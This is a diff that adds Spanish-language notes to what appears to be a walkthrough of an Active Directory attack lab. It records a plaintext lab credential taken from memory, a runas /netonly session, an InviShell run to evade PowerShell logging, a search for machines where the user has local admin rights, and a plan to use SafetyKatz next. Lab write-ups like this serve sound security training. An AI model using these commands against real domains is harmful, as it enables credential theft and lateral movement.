@@ -667,4 +667,27 @@ Y despues lo ejecutaremows
 .\Invoke-TheKatEx-vault-std97.ps1
 ```
 
-Encontrando las credenciales en texto claro del usuario *dcorp-srvadmin*
+Encontrando las credenciales en texto claro del usuario *dcorp-srvadmin::TheKeyUs3ron@anyMachine!*
+Ahora iniciaremos un nuevo proceso con los privilegios de *srvadmin*
+```shell
+runas /user:dcorp\srvadmin /netonly cmd
+```
+
+Iniciaremos una *InviShell*
+```shell
+C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
+```
+
+Cargaremos *Find-PSRemotingLocalAdminAcces* para ver sobre que otras maquinas tenemos privilegios de Administrador
+```shell
+. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
+```
+
+Y lo ejecutamos
+```shell
+Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local -Verbose
+```
+
+Obteniendo como respuesta que tenemos privilegios de administrador en *dcorp-mgmt*
+Tambien sabemos que en esa maquina tambien esta presente una sesion de *dcorp-svcadmin*.
+Utilizaremos *SafetyKatz*
